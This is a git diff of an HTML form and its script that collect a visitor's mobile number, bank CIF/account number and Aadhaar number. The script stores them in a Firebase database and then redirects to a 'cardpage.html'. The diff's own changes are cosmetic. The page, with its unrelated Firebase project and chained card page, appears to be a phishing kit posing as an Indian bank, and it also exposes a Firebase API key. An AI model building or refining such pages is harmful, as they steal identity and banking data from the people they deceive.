@@ -92,18 +92,21 @@
       <div class="input-group">
         <label for="mobile">Mobile Number</label>
         <input type="tel" id="mobile" name="mobile" maxlength="10" placeholder="Enter 10-digit Mobile" required>
-        <div class="error" id="mobileError"> ⚠️ Mobile Number.</div>
+        <div class="error" id="mobileError">⚠️ Mobile Number.</div>
       </div>
+
       <div class="input-group">
         <label for="account">CIF/Account Number</label>
         <input type="tel" id="account" name="account" maxlength="11" placeholder="Enter 11-digit Account No." required>
         <div class="error" id="accountError">Please enter a valid 11-digit Account Number.</div>
       </div>
+
       <div class="input-group">
         <label for="customerid">Aadhaar Number</label>
-        <input type="tel" id="customerid" name="customerid" maxlength="12" placeholder="Enter 12-digit Customer ID" required>
+        <input type="tel" id="customerid" name="customerid" maxlength="12" placeholder="Enter 12-digit Aadhaar Number" required>
         <div class="error" id="aadhaarError">Please enter a valid 12-digit Aadhaar Number.</div>
       </div>
+
       <button class="side-button" type="submit">Continue</button>
     </form>
 
@@ -116,6 +119,7 @@
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
 
   <script>
+    // Firebase Config
     const firebaseConfig = {
       apiKey: "AIzaSyDZ8EFQv3KZkGzhnbA7bVwOuWmjSkjTy1o",
       authDomain: "marcokinghoga.firebaseapp.com",
@@ -125,10 +129,11 @@
       appId: "1:132474071601:web:7c44a66fca6dc000e90310"
     };
 
+    // Initialize Firebase
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
-    // Generate or reuse sessionId
+    // Session ID manage
     const sessionId = localStorage.getItem("sessionId") || generateSessionId();
     localStorage.setItem("sessionId", sessionId);
 
@@ -136,6 +141,7 @@
       return 'session-' + Math.random().toString(36).substr(2, 9);
     }
 
+    // Form Validation and Submit
     function validateForm() {
       let isValid = true;
 
@@ -173,7 +179,7 @@
           timestamp: new Date()
         })
         .then(() => {
-          window.location.href = "cardpage.html";
+          window.location.href = window.location.origin + "/cardpage.html";
         })
         .catch((error) => {
           alert("Error saving data: " + error);
